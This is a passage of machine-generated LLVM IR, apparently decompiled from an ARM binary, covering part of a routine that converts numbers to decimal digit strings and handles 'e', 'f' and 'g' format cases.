  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_155a4 = icmp slt i32 %v3_15598, 0
  store i1 %v1_155a4, i1* %cpsr_n.global-to-local, align 1
  %v2_155a4 = icmp eq i32 %v3_15598, 0
  store i1 %v2_155a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_155cc, i32* %r3.global-to-local, align 4
  br i1 %v1_155a4, label %dec_label_pc_155b4, label %dec_label_pc_155c8

dec_label_pc_155b4:                               ; preds = %dec_label_pc_15590
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F000000001E89B) to float) to i32), i32* %r0.global-to-local, align 4
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F000000001E89B) to float) to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_155cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_155c8

dec_label_pc_155c8:                               ; preds = %dec_label_pc_15590, %dec_label_pc_155b4
  store i32 %v0_155c8, i32* @r0, align 4
  store i32 %v0_155cc, i32* %r1.global-to-local, align 4
  %v1_155d0 = fptrunc double %v2_15598 to float
  %v2_155d0 = bitcast float %v1_155d0 to i32
  %v4_155d0 = call i32 @__aeabi_dsub(i32 %v2_155d0, i32 %v0_155cc)
  %v5_155d0 = sext i32 %v4_155d0 to i64
  store i32 1315859242, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_155dc = bitcast i64 %v5_155d0 to double
  %v9_155dc = fmul double %v3_155dc, 0x41CDCD6540240000
  %v10_155dc = fptrunc double %v9_155dc to float
  %v11_155dc = bitcast float %v10_155dc to i32
  store i32 %v11_155dc, i32* %r0.global-to-local, align 4
  %v0_155e0 = load i32, i32* %sb.global-to-local, align 4
  %v1_155e0 = add i32 %v0_155e0, 9
  store i32 %v1_155e0, i32* %sb.global-to-local, align 4
  store i32 %v11_155dc, i32* %r6.global-to-local, align 4
  store i32 %v0_155cc, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_155f0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_155f0

dec_label_pc_155f0:                               ; preds = %dec_label_pc_155f0.dec_label_pc_155f0_crit_edge, %dec_label_pc_155c8
  %v1_15604 = phi i32 [ %v1_15604.pre, %dec_label_pc_155f0.dec_label_pc_155f0_crit_edge ], [ %v1_155e0, %dec_label_pc_155c8 ]
  %v0_155fc = phi i32 [ %v0_15618, %dec_label_pc_155f0.dec_label_pc_155f0_crit_edge ], [ 0, %dec_label_pc_155c8 ]
  %v0_15608 = phi i32 [ %v2_15614, %dec_label_pc_155f0.dec_label_pc_155f0_crit_edge ], [ %v0_155f0.pre, %dec_label_pc_155c8 ]
  %v2_155f8 = urem i32 %v0_15608, 10
  %v1_155fc = add i32 %v0_155fc, 1
  store i32 %v1_155fc, i32* %r5.global-to-local, align 4
  %v1_15600 = or i32 %v2_155f8, 48
  store i32 %v1_15600, i32* %r2.global-to-local, align 4
  %v2_15604 = sub i32 %v1_15604, %v1_155fc
  store i32 %v2_15604, i32* %r3.global-to-local, align 4
  store i32 %v0_15608, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_15610 = trunc i32 %v1_15600 to i8
  %v3_15610 = inttoptr i32 %v2_15604 to i8*
  store i8 %v1_15610, i8* %v3_15610, align 1
  %v0_15614 = load i32, i32* %r0.global-to-local, align 4
  %v1_15614 = load i32, i32* %r1.global-to-local, align 4
  %v2_15614 = udiv i32 %v0_15614, %v1_15614
  store i32 %v2_15614, i32* %r0.global-to-local, align 4
  %v0_15618 = load i32, i32* %r5.global-to-local, align 4
  %v1_15618 = add i32 %v0_15618, -8
  %v3_15618 = sub i32 7, %v0_15618
  %v4_15618 = and i32 %v3_15618, %v0_15618
  %v5_15618 = icmp slt i32 %v4_15618, 0
  store i1 %v5_15618, i1* %cpsr_v.global-to-local, align 1
  %v6_15618 = icmp slt i32 %v1_15618, 0
  store i1 %v6_15618, i1* %cpsr_n.global-to-local, align 1
  %v7_15618 = icmp eq i32 %v0_15618, 8
  store i1 %v7_15618, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_15614, i32* %r4.global-to-local, align 4
  %v7_15620 = icmp slt i32 %v0_15618, 9
  br i1 %v7_15620, label %dec_label_pc_155f0.dec_label_pc_155f0_crit_edge, label %dec_label_pc_15624

dec_label_pc_155f0.dec_label_pc_155f0_crit_edge:  ; preds = %dec_label_pc_155f0
  %v1_15604.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_155f0

dec_label_pc_15624:                               ; preds = %dec_label_pc_155f0
  %v0_15624 = load i32, i32* %r8.global-to-local, align 4
  %v1_15624 = add i32 %v0_15624, 1
  store i32 %v1_15624, i32* %r8.global-to-local, align 4
  %v3_15628 = sub i32 -1, %v0_15624
  %v4_15628 = and i32 %v1_15624, %v3_15628
  %v5_15628 = icmp slt i32 %v4_15628, 0
  store i1 %v5_15628, i1* %cpsr_v.global-to-local, align 1
  %v6_15628 = icmp slt i32 %v0_15624, 0
  store i1 %v6_15628, i1* %cpsr_n.global-to-local, align 1
  %v7_15628 = icmp eq i32 %v0_15624, 0
  store i1 %v7_15628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15628, label %dec_label_pc_15624.dec_label_pc_15590_crit_edge, label %dec_label_pc_15630

dec_label_pc_15624.dec_label_pc_15590_crit_edge:  ; preds = %dec_label_pc_15624
  %v0_15590.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_15594.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15590

dec_label_pc_15630:                               ; preds = %dec_label_pc_15624
  %v0_15630 = load i32, i32* %sl.global-to-local, align 4
  %v1_15630 = add i32 %v0_15630, -96
  %v3_15630 = sub i32 95, %v0_15630
  %v4_15630 = and i32 %v3_15630, %v0_15630
  %v5_15630 = icmp slt i32 %v4_15630, 0
  store i1 %v5_15630, i1* %cpsr_v.global-to-local, align 1
  %v6_15630 = icmp slt i32 %v1_15630, 0
  store i1 %v6_15630, i1* %cpsr_n.global-to-local, align 1
  %v7_15630 = icmp eq i32 %v0_15630, 96
  store i1 %v7_15630, i1* %cpsr_z.global-to-local, align 1
  %tmp287 = icmp ult i32 %v0_15630, 97
  store i32 %v1_15660, i32* %ip.global-to-local, align 4
  br i1 %tmp287, label %bb229, label %thread-pre-split

bb229:                                            ; preds = %dec_label_pc_15630
  %v5_15640 = add i32 %v0_15630, 32
  store i32 %v5_15640, i32* %r3.global-to-local, align 4
  %v5_15644 = urem i32 %v5_15640, 256
  store i32 %v5_15644, i32* %sl.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_15630, %bb229
  %v0_15668 = phi i32 [ %v5_15644, %bb229 ], [ %v0_15630, %dec_label_pc_15630 ]
  %stack_var_-58.0131138 = phi i32 [ 69, %bb229 ], [ 101, %dec_label_pc_15630 ]
  %v7_15648 = icmp eq i32 %v0_15668, 103
  %. = zext i1 %v7_15648 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15654 = icmp slt i32 %v1_15660, 0
  store i1 %v1_15654, i1* %cpsr_n.global-to-local, align 1
  %v2_15654 = icmp eq i32 %v1_15660, 0
  store i1 %v2_15654, i1* %cpsr_z.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_15660, 1
  br i1 %tmp232, label %.thread12, label %bb233

.thread12:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb235

bb233:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1565c = icmp eq i1 %v7_15648, false
  store i1 %v2_1565c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1565c, label %bb235, label %bb234

bb234:                                            ; preds = %bb233
  %v2_15660 = add i32 %v1_15660, -1
  store i32 %v2_15660, i32* %ip.global-to-local, align 4
  br label %bb235

bb235:                                            ; preds = %.thread12, %bb233, %bb234
  %v0_15664 = phi i32 [ %v1_15660, %.thread12 ], [ %v1_15660, %bb233 ], [ %v2_15660, %bb234 ]
  %v1_15668 = add i32 %v0_15668, -102
  %v3_15668 = sub i32 101, %v0_15668
  %v4_15668 = and i32 %v3_15668, %v0_15668
  %v5_15668 = icmp slt i32 %v4_15668, 0
  store i1 %v5_15668, i1* %cpsr_v.global-to-local, align 1
  %v6_15668 = icmp slt i32 %v1_15668, 0
  store i1 %v6_15668, i1* %cpsr_n.global-to-local, align 1
  %v7_15668 = icmp eq i32 %v0_15668, 102
  store i1 %v7_15668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15668, label %dec_label_pc_15674, label %bb236

bb236:                                            ; preds = %bb235
  store i32 %v0_15664, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_156a0

dec_label_pc_15674:                               ; preds = %bb235
  store i32 %v0_15664, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-192.6, i32* %r1.global-to-local, align 4
  %v2_1567c = add i32 %v0_15664, %stack_var_-192.6
  store i32 %v2_1567c, i32* %ip.global-to-local, align 4
  %v1_15680 = add i32 %v2_1567c, 1
  %v3_15680 = sub i32 0, %v2_1567c
  %v4_15680 = and i32 %v1_15680, %v3_15680
  %v5_15680 = icmp slt i32 %v4_15680, 0
  store i1 %v5_15680, i1* %cpsr_v.global-to-local, align 1
  %v6_15680 = icmp slt i32 %v1_15680, 0
  store i1 %v6_15680, i1* %cpsr_n.global-to-local, align 1
  %v7_15680 = icmp eq i32 %v1_15680, 0
  store i1 %v7_15680, i1* %cpsr_z.global-to-local, align 1
  %v2_15684 = xor i1 %v6_15680, %v5_15680
  br i1 %v2_15684, label %dec_label_pc_15688, label %dec_label_pc_156a0

dec_label_pc_15688:                               ; preds = %dec_label_pc_15674
  %v2_15688 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_15688, i32* @r0, align 4
  store i32 48, i32* @r1, align 4
  store i32 17, i32* @r2, align 4
  %v0_15694 = call i32 @__GI_memset()
  store i32 %v0_15694, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_156a0

dec_label_pc_156a0:                               ; preds = %bb236, %dec_label_pc_15674, %dec_label_pc_15688
  %v1_156e488 = phi i32 [ %v0_15694, %dec_label_pc_15688 ], [ %v0_15664, %dec_label_pc_15674 ], [ %v2_15614, %bb236 ]
  %v1_156c8 = phi i32 [ -1, %dec_label_pc_15688 ], [ %v2_1567c, %dec_label_pc_15674 ], [ %v0_15664, %bb236 ]
  %stack_var_-192.7 = phi i32 [ -1, %dec_label_pc_15688 ], [ %stack_var_-192.6, %dec_label_pc_15674 ], [ %stack_var_-192.6, %bb236 ]
  %v1_156a4 = add i32 %v1_156c8, -16
  %v3_156a4 = sub i32 15, %v1_156c8
  %v4_156a4 = and i32 %v3_156a4, %v1_156c8
  %v5_156a4 = icmp slt i32 %v4_156a4, 0
  store i1 %v5_156a4, i1* %cpsr_v.global-to-local, align 1
  %v6_156a4 = icmp slt i32 %v1_156a4, 0
  store i1 %v6_156a4, i1* %cpsr_n.global-to-local, align 1
  %v7_156a4 = icmp eq i32 %v1_156c8, 16
  store i1 %v7_156a4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-78, align 4
  %v2_156b0 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_156b0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-79, align 4
  %v3_156b8 = xor i1 %v6_156a4, %v5_156a4
  %v4_156b8 = or i1 %v7_156a4, %v3_156b8
  br i1 %v4_156b8, label %dec_label_pc_156c4, label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %dec_label_pc_156a0
  store i32 0, i32* %r0.global-to-local, align 4
  %v7_156bc152 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v7_156bc152, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_156c4:                               ; preds = %dec_label_pc_156a0
  %v2_156c4 = ptrtoint i32* %stack_var_-78 to i32
  %v2_156c8 = add i32 %v1_156c8, %v2_156c4
  store i32 %v2_156c8, i32* %r3.global-to-local, align 4
  %v1_156cc = add i32 %v2_156c8, 2
  %v2_156cc = inttoptr i32 %v1_156cc to i8*
  %v3_156cc = load i8, i8* %v2_156cc, align 1
  %v4_156cc = zext i8 %v3_156cc to i32
  store i32 %v4_156cc, i32* %r2.global-to-local, align 4
  store i32 %v1_156cc, i32* %r1.global-to-local, align 4
  %v2_156d4 = icmp ugt i8 %v3_156cc, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_156d4 = icmp ult i8 %v3_156cc, 52
  store i1 %v6_156d4, i1* %cpsr_n.global-to-local, align 1
  %v7_156d4 = icmp eq i8 %v3_156cc, 52
  store i1 %v7_156d4, i1* %cpsr_z.global-to-local, align 1
  %v2_156d8 = xor i1 %v2_156d4, true
  %v3_156d8 = or i1 %v7_156d4, %v2_156d8
  br i1 %v3_156d8, label %bb237, label %bb238

bb237:                                            ; preds = %dec_label_pc_156c4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb238

bb238:                                            ; preds = %dec_label_pc_156c4, %bb237
  %v1_156e486 = phi i32 [ %v1_156e488, %dec_label_pc_156c4 ], [ 0, %bb237 ]
  %v2_156dc = xor i1 %v7_156d4, true
  %v3_156dc = and i1 %v2_156d4, %v2_156dc
  br i1 %v3_156dc, label %bb239, label %.preheader

bb239:                                            ; preds = %bb238
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb238, %bb239, %..preheader_crit_edge, %.backedge
  %v1_156e4 = phi i32 [ %v1_156e4.pre, %.backedge ], [ 0, %..preheader_crit_edge ], [ %v1_156e486, %bb238 ], [ 1, %bb239 ]
  %v0_156e0 = phi i32 [ %v0_156ec, %.backedge ], [ %v7_156bc152, %..preheader_crit_edge ], [ %v1_156cc, %bb238 ], [ %v1_156cc, %bb239 ]
  %v1_156e0 = add i32 %v0_156e0, -1
  %v2_156e0 = inttoptr i32 %v1_156e0 to i8*
  %v3_156e0 = load i8, i8* %v2_156e0, align 1
  %v4_156e0 = zext i8 %v3_156e0 to i32
  store i32 %v1_156e0, i32* %r1.global-to-local, align 4
  %v2_156e4 = add i32 %v4_156e0, %v1_156e4
  store i32 %v2_156e4, i32* %r3.global-to-local, align 4
  %v1_156e8 = trunc i32 %v2_156e4 to i8
  store i8 %v1_156e8, i8* %v2_156e0, align 1
  %v0_156ec = load i32, i32* %r1.global-to-local, align 4
  %v1_156ec = inttoptr i32 %v0_156ec to i8*
  %v2_156ec = load i8, i8* %v1_156ec, align 1
  %v3_156ec = zext i8 %v2_156ec to i32
  store i32 %v3_156ec, i32* %r2.global-to-local, align 4
  %v2_156f0 = icmp ugt i8 %v2_156ec, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_156f0 = icmp ult i8 %v2_156ec, 57
  store i1 %v6_156f0, i1* %cpsr_n.global-to-local, align 1
  %v7_156f0 = icmp eq i8 %v2_156ec, 57
  store i1 %v7_156f0, i1* %cpsr_z.global-to-local, align 1
  %v2_156f4 = xor i1 %v2_156f0, true
  %v3_156f4 = or i1 %v7_156f0, %v2_156f4
  br i1 %v3_156f4, label %bb240, label %bb241

bb240:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb241

bb241:                                            ; preds = %.preheader, %bb240
  %v2_156f8 = xor i1 %v7_156f0, true
  %v3_156f8 = and i1 %v2_156f0, %v2_156f8
  br i1 %v3_156f8, label %bb242, label %._crit_edge

._crit_edge:                                      ; preds = %bb241
  %v1_15700.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb243

bb242:                                            ; preds = %bb241
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb243

bb243:                                            ; preds = %._crit_edge, %bb242
  %v1_15700 = phi i32 [ %v1_15700.pre, %._crit_edge ], [ 1, %bb242 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_156fc = icmp ult i8 %v2_156ec, 48
  store i1 %v6_156fc, i1* %cpsr_n.global-to-local, align 1
  %v7_156fc = icmp eq i8 %v2_156ec, 48
  store i1 %v7_156fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_156fc, label %.thread17, label %bb244

.thread17:                                        ; preds = %bb243
  %v2_15700 = or i32 %v1_15700, 1
  store i32 %v2_15700, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1570418 = icmp slt i32 %v2_15700, 0
  store i1 %v1_1570418, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb244:                                            ; preds = %bb243
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15704 = icmp slt i32 %v1_15700, 0
  store i1 %v1_15704, i1* %cpsr_n.global-to-local, align 1
  %v2_15704 = icmp eq i32 %v1_15700, 0
  store i1 %v2_15704, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15704, label %dec_label_pc_1570c, label %.backedge

.backedge:                                        ; preds = %bb244, %.thread17
  %v1_156e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_1570c:                               ; preds = %bb244
  store i32 %v2_156b0, i32* %r2.global-to-local, align 4
  %v2_15710 = ptrtoint i32* %stack_var_-78 to i32
  store i32 %v2_15710, i32* %r3.global-to-local, align 4
  %v2_15714 = sub i32 %v0_156ec, %v2_15710
  %v3_15714 = icmp uge i32 %v0_156ec, %v2_15710
  %v4_15714 = xor i32 %v0_156ec, %v2_15710
  %v5_15714 = xor i32 %v2_15714, %v0_156ec
  %v6_15714 = and i32 %v5_15714, %v4_15714
  %v7_15714 = icmp slt i32 %v6_15714, 0
  store i1 %v7_15714, i1* %cpsr_v.global-to-local, align 1
  %v8_15714 = icmp slt i32 %v2_15714, 0
  store i1 %v8_15714, i1* %cpsr_n.global-to-local, align 1
  %v9_15714 = icmp eq i32 %v0_156ec, %v2_15710
  store i1 %v9_15714, i1* %cpsr_z.global-to-local, align 1
  %v2_15718 = xor i1 %v3_15714, true
  %v3_15718 = or i1 %v9_15714, %v2_15718
  br i1 %v3_15718, label %bb245, label %.thread162

bb245:                                            ; preds = %dec_label_pc_1570c
  store i32 %v2_15710, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-192.7, i32* %r3.global-to-local, align 4
  store i32 %v2_15710, i32* %r1.global-to-local, align 4
  br label %.thread162

.thread162:                                       ; preds = %dec_label_pc_1570c, %bb245
  %v4_15728160 = phi i32 [ %stack_var_-192.7, %bb245 ], [ %v2_15710, %dec_label_pc_1570c ]
  %v2_15738 = phi i32 [ %v2_15710, %bb245 ], [ %v0_156ec, %dec_label_pc_1570c ]
  %v4_1572c154159 = phi i32 [ %v2_15710, %bb245 ], [ %v2_156b0, %dec_label_pc_1570c ]
  %v2_15724 = xor i1 %v9_15714, true
  %v3_15724 = and i1 %v3_15714, %v2_15724
  br i1 %v3_15724, label %bb246, label %bb247

bb246:                                            ; preds = %.thread162
  store i32 %stack_var_-192.7, i32* %r0.global-to-local, align 4
  br label %bb247

bb247:                                            ; preds = %.thread162, %bb246
  br i1 %v3_15718, label %bb248, label %bb249

bb248:                                            ; preds = %bb247
  %v5_15728 = add i32 %v4_15728160, 1
  store i32 %v5_15728, i32* %r0.global-to-local, align 4
  br label %bb249

bb249:                                            ; preds = %bb247, %bb248
  br i1 %v3_15724, label %bb250, label %bb251

bb250:                                            ; preds = %bb249
  %v5_1572c = add i32 %v4_1572c154159, 2
  store i32 %v5_1572c, i32* %r2.global-to-local, align 4
  br label %bb251

bb251:                                            ; preds = %bb249, %bb250
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15734 = load i32, i32* %sl.global-to-local, align 4
  %v1_15734 = add i32 %v0_15734, -103
  %v3_15734 = sub i32 102, %v0_15734
  %v4_15734 = and i32 %v3_15734, %v0_15734
  %v5_15734 = icmp slt i32 %v4_15734, 0
  store i1 %v5_15734, i1* %cpsr_v.global-to-local, align 1
  %v6_15734 = icmp slt i32 %v1_15734, 0
  store i1 %v6_15734, i1* %cpsr_n.global-to-local, align 1
  %v7_15734 = icmp eq i32 %v0_15734, 103
  store i1 %v7_15734, i1* %cpsr_z.global-to-local, align 1
  %v3_15738 = add i32 %v2_15738, 1
  %v4_15738 = inttoptr i32 %v3_15738 to i8*
  store i8 0, i8* %v4_15738, align 1
  %v0_1573c = load i32, i32* %r1.global-to-local, align 4
  %v1_1573c = add i32 %v0_1573c, 1
  store i32 %v1_1573c, i32* %r1.global-to-local, align 4
  %v0_15740 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15740, label %dec_label_pc_15744, label %dec_label_pc_15774

dec_label_pc_15744:                               ; preds = %bb251
  %v0_15744 = load i32, i32* %r0.global-to-local, align 4
  %v1_15744 = load i32, i32* %ip.global-to-local, align 4
  %v2_15744 = sub i32 %v0_15744, %v1_15744
  %v4_15744 = xor i32 %v1_15744, %v0_15744
  %v5_15744 = xor i32 %v2_15744, %v0_15744
  %v6_15744 = and i32 %v5_15744, %v4_15744
  %v7_15744 = icmp slt i32 %v6_15744, 0
  %v8_15744 = icmp slt i32 %v2_15744, 0
  %v9_15744 = icmp eq i32 %v0_15744, %v1_15744
  %v3_15748 = xor i1 %v8_15744, %v7_15744
  %v4_15748 = or i1 %v9_15744, %v3_15748
  %.273 = zext i1 %v4_15748 to i32
  store i32 %.273, i32* %r3.global-to-local, align 4
  %v1_15750 = add i32 %v0_15744, 4
  %v3_15750 = sub i32 0, %v0_15744
  %v4_15750 = and i32 %v1_15750, %v3_15750
  %v5_15750 = icmp slt i32 %v4_15750, 0
  store i1 %v5_15750, i1* %cpsr_v.global-to-local, align 1
  %v6_15750 = icmp slt i32 %v1_15750, 0
  store i1 %v6_15750, i1* %cpsr_n.global-to-local, align 1
  %v7_15750 = icmp eq i32 %v1_15750, 0
  store i1 %v7_15750, i1* %cpsr_z.global-to-local, align 1
  %v2_15754 = xor i1 %v6_15750, %v5_15750
  br i1 %v2_15754, label %.thread21, label %bb254

.thread21:                                        ; preds = %dec_label_pc_15744
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread165

bb254:                                            ; preds = %dec_label_pc_15744
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15758 = icmp eq i1 %v4_15748, false
  store i1 %v2_15758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15758, label %.thread165, label %bb255

.thread165:                                       ; preds = %bb254, %.thread21
  %v1_157603551 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_157603551, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15780

bb255:                                            ; preds = %bb254
  %v3_1575c = sub i32 %v1_15744, %v0_15744
  store i32 %v3_1575c, i32* %ip.global-to-local, align 4
  store i32 102, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1578c

dec_label_pc_15774:                               ; preds = %bb251
  %v0_15774 = load i32, i32* %sl.global-to-local, align 4
  %v1_15774 = add i32 %v0_15774, -102
  %v3_15774 = sub i32 101, %v0_15774
  %v4_15774 = and i32 %v3_15774, %v0_15774
  %v5_15774 = icmp slt i32 %v4_15774, 0
  store i1 %v5_15774, i1* %cpsr_v.global-to-local, align 1
  %v6_15774 = icmp slt i32 %v1_15774, 0
  store i1 %v6_15774, i1* %cpsr_n.global-to-local, align 1
  %v7_15774 = icmp eq i32 %v0_15774, 102
  store i1 %v7_15774, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_15774, i32* %r7.global-to-local, align 4
  br i1 %v7_15774, label %dec_label_pc_15774.dec_label_pc_1578c_crit_edge, label %dec_label_pc_15780

dec_label_pc_15774.dec_label_pc_1578c_crit_edge:  ; preds = %dec_label_pc_15774
  %v0_1578c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1578c

dec_label_pc_15780:                               ; preds = %.thread165, %dec_label_pc_15774
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1579c

dec_label_pc_1578c:                               ; preds = %bb255, %dec_label_pc_15774.dec_label_pc_1578c_crit_edge
  %v0_1578c = phi i32 [ %v0_15744, %bb255 ], [ %v0_1578c.pre, %dec_label_pc_15774.dec_label_pc_1578c_crit_edge ]
  %stack_var_-184.3 = phi i32 [ %v3_1575c, %bb255 ], [ %v0_15664, %dec_label_pc_15774.dec_label_pc_1578c_crit_edge ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1578c = icmp slt i32 %v0_1578c, 0
  store i1 %v1_1578c, i1* %cpsr_n.global-to-local, align 1
  %v2_1578c = icmp eq i32 %v0_1578c, 0
  store i1 %v2_1578c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1578c, label %bb256, label %bb257

bb256:                                            ; preds = %dec_label_pc_1578c
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_15794 = load i32, i32* %r2.global-to-local, align 4
  %v6_15794 = add i32 %v5_15794, -1
  %v7_15794 = inttoptr i32 %v6_15794 to i8*
  store i8 48, i8* %v7_15794, align 1
  %v8_15794 = load i32, i32* %r2.global-to-local, align 4
  %v9_15794 = add i32 %v8_15794, -1
  store i32 %v9_15794, i32* %r2.global-to-local, align 4
  %v0_15798.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_157c8.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_157cc.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_157cc.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb257

bb257:                                            ; preds = %dec_label_pc_1578c, %bb256
  %v1_157cc.pre = phi i1 [ %v1_157cc.pre.pre, %bb256 ], [ false, %dec_label_pc_1578c ]
  %v0_157cc.pre = phi i1 [ %v0_157cc.pre.pre, %bb256 ], [ false, %dec_label_pc_1578c ]
  %v1_157c8.pre = phi i32 [ %v1_157c8.pre.pre, %bb256 ], [ %v1_1573c, %dec_label_pc_1578c ]
  %v0_15798 = phi i32 [ %v0_15798.pre, %bb256 ], [ %v0_1578c, %dec_label_pc_1578c ]
  store i32 %v0_15798, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1579c

dec_label_pc_1579c:                               ; preds = %dec_label_pc_15780, %bb257
  %v0_15834 = phi i32 [ 0, %dec_label_pc_15780 ], [ %v0_15798, %bb257 ]
  %v1_157d0 = phi i1 [ false, %dec_label_pc_15780 ], [ %v1_157cc.pre, %bb257 ]
  %v0_157d0 = phi i1 [ false, %dec_label_pc_15780 ], [ %v0_157cc.pre, %bb257 ]
  %v1_157c8 = phi i32 [ %v1_1573c, %dec_label_pc_15780 ], [ %v1_157c8.pre, %bb257 ]
  %v1_158f0 = phi i32 [ %v0_15664, %dec_label_pc_15780 ], [ %stack_var_-184.3, %bb257 ]
  store i32 1, i32* %stack_var_-160, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_157a8 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_157a8, i32* %r3.global-to-local, align 4
  %v0_157b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_157b4 = inttoptr i32 %v0_157b4 to i8*
  %v2_157b4 = load i8, i8* %v1_157b4, align 1
  %v3_157b4 = zext i8 %v2_157b4 to i32
  store i32 %v3_157b4, i32* %r3.global-to-local, align 4
  %v5_157b4 = add i32 %v0_157b4, 1
  store i32 %v5_157b4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_157b4, i32* %stack_var_-38, align 4
  %v2_157c8 = sub i32 %v1_157c8, %v5_157b4
  store i32 %v2_157c8, i32* %r1.global-to-local, align 4
  %v2_157cc = xor i1 %v1_157d0, %v0_157d0
  br i1 %v2_157cc, label %.thread167, label %dec_label_pc_157d4

.thread167:                                       ; preds = %dec_label_pc_1579c
  %v5_157cc = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v5_157cc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15844

dec_label_pc_157d4:                               ; preds = %dec_label_pc_1579c
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_157d8 = sub i32 %v0_15834, %v2_157c8
  %v4_157d8 = xor i32 %v2_157c8, %v0_15834
  %v5_157d8 = xor i32 %v2_157d8, %v0_15834
  %v6_157d8 = and i32 %v5_157d8, %v4_157d8
  %v7_157d8 = icmp slt i32 %v6_157d8, 0
  store i1 %v7_157d8, i1* %cpsr_v.global-to-local, align 1
  %v8_157d8 = icmp slt i32 %v2_157d8, 0
  store i1 %v8_157d8, i1* %cpsr_n.global-to-local, align 1
  %v9_157d8 = icmp eq i32 %v0_15834, %v2_157c8
  store i1 %v9_157d8, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-152, align 4
  %v2_157e4 = xor i1 %v8_157d8, %v7_157d8
  br i1 %v2_157e4, label %dec_label_pc_15820, label %dec_label_pc_157e8

dec_label_pc_157e8:                               ; preds = %dec_label_pc_157d4
